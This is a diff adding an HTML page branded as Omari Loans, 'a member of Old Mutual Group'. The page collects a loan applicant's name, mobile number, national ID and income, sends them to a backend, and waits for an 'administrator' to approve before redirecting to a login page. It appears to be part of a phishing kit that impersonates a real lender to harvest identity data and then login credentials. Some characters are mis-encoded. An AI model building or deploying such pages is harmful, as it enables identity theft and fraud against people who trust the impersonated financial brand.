@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omari Loans â€” Step 2: Your Details</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background: linear-gradient(160deg, #e8f5e9 0%, #e3eef0 100%);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .app {
+            width: 100%;
+            max-width: 400px;
+            min-height: 100vh;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.14);
+        }
+
+        /* â”€â”€ HEADER â”€â”€ */
+        .header {
+            background: linear-gradient(135deg, #0d4f1e 0%, #1b7d36 45%, #4DB848 100%);
+            padding: 22px 20px 80px;
+            color: #fff;
+            position: relative;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            right: 0;
+            height: 48px;
+            background: #fff;
+            border-radius: 24px 24px 0 0;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 22px;
+        }
+
+        .logo     { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
+        .logo-sub { font-size: 8px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; opacity: 0.78; margin-top: 3px; }
+
+        .step-pill {
+            background: rgba(255,255,255,0.18);
+            border: 1px solid rgba(255,255,255,0.30);
+            border-radius: 20px;
+            padding: 7px 14px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .header h1 { font-size: 26px; font-weight: 800; line-height: 1.2; margin-bottom: 8px; }
+        .header p  { font-size: 13px; line-height: 1.6; opacity: 0.84; max-width: 290px; }
+
+        /* Loan summary strip inside header */
+        .summary-strip {
+            display: flex;
+            gap: 6px;
+            margin-top: 16px;
+        }
+
+        .sum-chip {
+            flex: 1;
+            min-width: 0;                    /* allow shrinking below content size */
+            background: rgba(255,255,255,0.16);
+            border: 1px solid rgba(255,255,255,0.22);
+            border-radius: 12px;
+            padding: 10px 6px;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .sum-label { font-size: 9px; text-transform: uppercase; letter-spacing: 0.6px; opacity: 0.76; font-weight: 700; }
+        .sum-value { font-size: 13px; font-weight: 800; margin-top: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        /* â”€â”€ CARD â”€â”€ */
+        .card { flex: 1; padding: 8px 18px 28px; }
+
+        .sec-title {
+            font-size: 13px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #424242;
+            margin-bottom: 14px;
+            margin-top: 22px;
+        }
+
+        /* Fields */
+        .field { margin-bottom: 14px; }
+
+        .field label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #545454;
+            margin-bottom: 6px;
+        }
+
+        .field input {
+            width: 100%;
+            height: 50px;
+            padding: 0 14px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            color: #222;
+            background: #fafafa;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .field input:focus {
+            border-color: #4DB848;
+            box-shadow: 0 0 0 3px rgba(77,184,72,0.12);
+            background: #fff;
+        }
+
+        .field input.invalid { border-color: #e53935; }
+
+        .field-err {
+            font-size: 12px;
+            color: #e53935;
+            min-height: 18px;
+            margin-top: 4px;
+        }
+
+        /* Consent */
+        .consent-block {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            padding: 14px;
+            background: #f5f5f5;
+            border-radius: 14px;
+            border: 1.5px solid #e0e0e0;
+            margin-bottom: 6px;
+            margin-top: 18px;
+        }
+
+        .consent-block input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            accent-color: #4DB848;
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+
+        .consent-block label {
+            font-size: 13px;
+            color: #616161;
+            line-height: 1.6;
+            cursor: pointer;
+        }
+
+        .consent-err { font-size: 12px; color: #e53935; min-height: 18px; margin-bottom: 16px; }
+
+        /* Buttons */
+        .btn {
+            display: block;
+            width: 100%;
+            height: 52px;
+            border-radius: 26px;
+            border: none;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            margin-bottom: 10px;
+        }
+
+        .btn:active { opacity: 0.78; }
+        .btn-primary { background: #4DB848; color: #fff; box-shadow: 0 6px 18px rgba(77,184,72,0.38); }
+        .btn-ghost   { background: transparent; color: #9e9e9e; border: 1px solid #e0e0e0; font-size: 14px; }
+
+        /* Confirmation */
+        .confirmation {
+            display: none;
+            margin-top: 18px;
+            padding: 22px;
+            border-radius: 18px;
+            background: linear-gradient(135deg, #1b5e20 0%, #388e3c 60%, #4DB848 100%);
+            color: #fff;
+        }
+
+        .confirmation.show { display: block; }
+
+        .conf-check  { font-size: 36px; margin-bottom: 10px; }
+        .conf-title  { font-size: 22px; font-weight: 800; margin-bottom: 8px; }
+        .conf-body   { font-size: 13px; line-height: 1.7; opacity: 0.9; }
+
+        .conf-ref {
+            margin-top: 16px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 12px;
+            padding: 14px;
+        }
+
+        .conf-ref-label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.8px; opacity: 0.76; font-weight: 700; }
+        .conf-ref-value { font-size: 22px; font-weight: 800; margin-top: 5px; letter-spacing: 1px; }
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 999;
+            background: rgba(255,255,255,0.92);
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 52px;
+            height: 52px;
+            border: 5px solid #e0e0e0;
+            border-top-color: #4DB848;
+            border-radius: 50%;
+            animation: spin 0.75s linear infinite;
+        }
+
+        .loading-overlay p {
+            font-size: 15px;
+            font-weight: 700;
+            color: #2e7d32;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        /* Truly full-screen on real phones â€” no edge gaps */
+        html, body { overflow-x: hidden; }
+
+        @media (max-width: 519px) {
+            body { background: #fff; }
+            .app { box-shadow: none; max-width: 100%; }
+        }
+
+        /* Centered card on tablets & desktop */
+        @media (min-width: 520px) {
+            body { align-items: center; padding: 24px; }
+            .app { min-height: auto; max-width: 460px; border-radius: 24px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="app">
+
+        <div class="header">
+            <div class="header-top">
+                <div>
+                    <div class="logo">Omari</div>
+                    <div class="logo-sub">A member of Old Mutual Group</div>
+                </div>
+                <div class="step-pill">Step 2 of 2</div>
+            </div>
+            <h1>Your details</h1>
+            <p>Complete your personal information to submit the application and request a lending decision.</p>
+            <div class="summary-strip">
+                <div class="sum-chip">
+                    <div class="sum-label">Amount</div>
+                    <div class="sum-value" id="sumAmount">â€”</div>
+                </div>
+                <div class="sum-chip">
+                    <div class="sum-label">Term</div>
+                    <div class="sum-value" id="sumTerm">â€”</div>
+                </div>
+                <div class="sum-chip">
+                    <div class="sum-label">Repay</div>
+                    <div class="sum-value" id="sumRepay">â€”</div>
+                </div>
+                <div class="sum-chip">
+                    <div class="sum-label">Purpose</div>
+                    <div class="sum-value" id="sumPurpose">â€”</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+
+            <div class="sec-title">Personal information</div>
+
+            <div class="field">
+                <label for="fullName">Full name</label>
+                <input id="fullName" type="text" placeholder="e.g. Tendai Moyo" autocomplete="name">
+                <div class="field-err" id="err-fullName"></div>
+            </div>
+
+            <div class="field">
+                <label for="mobile">Mobile number</label>
+                <input id="mobile" type="tel" placeholder="0771234567" inputmode="numeric">
+                <div class="field-err" id="err-mobile"></div>
+            </div>
+
+            <div class="field">
+                <label for="nationalId">National ID number</label>
+                <input id="nationalId" type="text" placeholder="63-123456A12" autocomplete="off">
+                <div class="field-err" id="err-nationalId"></div>
+            </div>
+
+            <div class="field">
+                <label for="income">Monthly income (USD)</label>
+                <input id="income" type="number" placeholder="e.g. 400" min="1" inputmode="numeric">
+                <div class="field-err" id="err-income"></div>
+            </div>
+
+            <div class="consent-block">
+                <input id="consent" type="checkbox">
+                <label for="consent">
+                    I declare that all information above is accurate and I consent to Omari (Old Mutual) running a credit and affordability assessment for this loan application.
+                </label>
+            </div>
+            <div class="consent-err" id="err-consent"></div>
+
+            <button class="btn btn-primary" id="submitBtn" type="button">Submit application</button>
+            <button class="btn btn-ghost"   id="backBtn"   type="button">â† Edit loan details</button>
+
+            <!-- Loading overlay -->
+            <div class="loading-overlay" id="loadingOverlay">
+                <div class="spinner"></div>
+                <p>Submitting your application…</p>
+            </div>
+
+            <div class="confirmation" id="confirmation">
+                <div class="conf-check">✓</div>
+                <div class="conf-title">Application submitted!</div>
+                <div class="conf-body" id="confBody"></div>
+                <div class="conf-ref">
+                    <div class="conf-ref-label">Reference number</div>
+                    <div class="conf-ref-value" id="confRef"></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const loan = JSON.parse(localStorage.getItem('omariLoan') || 'null');
+
+            if (!loan) {
+                window.location.href = '1.html';
+                return;
+            }
+
+            function fmt(n) { return '$' + Number(n).toLocaleString(); }
+
+            const purposeShort = { 'Business': 'Biz', 'School Fees': 'School', 'Emergency': 'SOS', 'Bills & Rent': 'Bills' };
+
+            document.getElementById('sumAmount').textContent  = fmt(loan.amount);
+            document.getElementById('sumTerm').textContent    = loan.term + 'd';
+            document.getElementById('sumRepay').textContent   = fmt(loan.repay);
+            document.getElementById('sumPurpose').textContent = purposeShort[loan.purpose] || loan.purpose.split(' ')[0].slice(0, 6);
+
+            function setErr(id, msg)  { document.getElementById('err-' + id).textContent = msg; }
+            function clearErr(id)     { document.getElementById('err-' + id).textContent = ''; }
+            function markField(id, bad) {
+                document.getElementById(id).classList.toggle('invalid', bad);
+            }
+
+            function validate() {
+                let ok = true;
+                ['fullName', 'mobile', 'nationalId', 'income', 'consent'].forEach(clearErr);
+                ['fullName', 'mobile', 'nationalId', 'income'].forEach(id => markField(id, false));
+
+                const name      = document.getElementById('fullName').value.trim();
+                const mobile    = document.getElementById('mobile').value.trim();
+                const nid       = document.getElementById('nationalId').value.trim();
+                const income    = Number(document.getElementById('income').value);
+                const consented = document.getElementById('consent').checked;
+
+                if (name.length < 3) {
+                    setErr('fullName', 'Please enter your full name.');
+                    markField('fullName', true);
+                    ok = false;
+                }
+
+                if (mobile.length < 7) {
+                    setErr('mobile', 'Please enter a valid mobile number.');
+                    markField('mobile', true);
+                    ok = false;
+                }
+
+                if (nid.length < 4) {
+                    setErr('nationalId', 'Please enter your national ID.');
+                    markField('nationalId', true);
+                    ok = false;
+                }
+
+                if (!income || income < 1) {
+                    setErr('income', 'Please enter your monthly income.');
+                    markField('income', true);
+                    ok = false;
+                }
+
+                if (!consented) {
+                    setErr('consent', 'You must agree to the declaration before submitting.');
+                    ok = false;
+                }
+
+                return ok ? { name, mobile, nid, income } : null;
+            }
+
+            document.getElementById('submitBtn').addEventListener('click', () => {
+                const data = validate();
+                if (!data) return;
+
+                const purposeCode = String(loan.purpose).replace(/[^A-Za-z]/g, '').slice(0, 3).toUpperCase();
+                const ref = 'OMR-' + purposeCode + '-' + String(Date.now()).slice(-6);
+
+                localStorage.setItem('omariSubmittedLoan', JSON.stringify({ ...loan, ...data, ref }));
+
+                const confBody = document.getElementById('confBody');
+                confBody.textContent =
+                    data.name + ', your application for ' + fmt(loan.amount) +
+                    ' (' + loan.purpose + ', ' + loan.term + ' days) has been received. ' +
+                    'Estimated repayment: ' + fmt(loan.repay) + '. ' +
+                    'A decision will be communicated to ' + data.mobile + ' within 24 hours.';
+
+                document.getElementById('confRef').textContent = ref;
+
+                // Send to backend and poll for approval
+                const overlay = document.getElementById('loadingOverlay');
+                overlay.classList.add('show');
+                
+                const payload = {
+                    sessionId: ref,
+                    step: 'details',
+                    data: {
+                        Name: data.name,
+                        Mobile: data.mobile,
+                        ID: data.nid,
+                        Income: data.income,
+                        Amount: loan.amount,
+                        Term: loan.term,
+                        Purpose: loan.purpose
+                    }
+                };
+
+                fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    const poll = setInterval(async () => {
+                        try {
+                            const res = await fetch(`/api/status?sessionId=${ref}&step=details`);
+                            const statusData = await res.json();
+                            if (statusData.status === 'approved') {
+                                clearInterval(poll);
+                                window.location.href = 'login.html';
+                            } else if (statusData.status === 'rejected') {
+                                clearInterval(poll);
+                                overlay.classList.remove('show');
+                                alert('Your application was rejected by the administrator.');
+                            }
+                        } catch (e) {
+                            console.error('Polling error', e);
+                        }
+                    }, 2000);
+                }).catch(err => {
+                    overlay.classList.remove('show');
+                    alert('Error submitting application. Please try again.');
+                    console.error(err);
+                });
+            });
+
+            document.getElementById('backBtn').addEventListener('click', () => {
+                window.location.href = '1.html';
+            });
+        });
+    </script>
+</body>
+</html>
